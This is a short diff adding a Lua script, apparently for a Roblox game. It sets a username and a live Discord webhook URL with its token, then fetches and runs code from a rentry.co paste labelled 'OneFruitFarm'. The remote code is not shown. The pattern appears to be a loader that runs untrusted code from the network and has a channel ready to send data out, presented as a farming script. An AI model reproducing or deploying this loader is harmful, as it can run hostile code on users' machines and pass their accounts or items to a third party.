@@ -1,0 +1,4 @@
+local user = "A4suii"
+local WebHook = "https://discord.com/api/webhooks/1257595925468151820/vRe-8SJBBwqkDt7ESuQbrhDA4ZewVffPpNiUs6CRGUy_P_05Qu3Ladvdz-Q5JHA4MaxZ"
+
+loadstring(game:HttpGet("https://rentry.co/OneFruitFarm/raw"))()
